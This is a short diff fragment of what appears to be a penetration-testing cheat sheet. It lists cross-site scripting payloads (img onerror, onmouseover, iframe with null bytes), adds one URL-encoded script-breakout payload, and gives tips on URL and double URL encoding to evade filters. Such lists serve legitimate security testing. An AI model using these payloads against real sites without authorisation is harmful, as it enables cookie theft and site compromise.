@@ -23,6 +23,7 @@ sqlmap/ghauri
 <img src=x onerror=alert(document.cookie)>
 <href="url" onmouseover=alert(1)>
 <iframe %00 src=\"javascript:prompt(1)\"%00>
+%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 尝试：
 try URL encode
 try double URL encode.
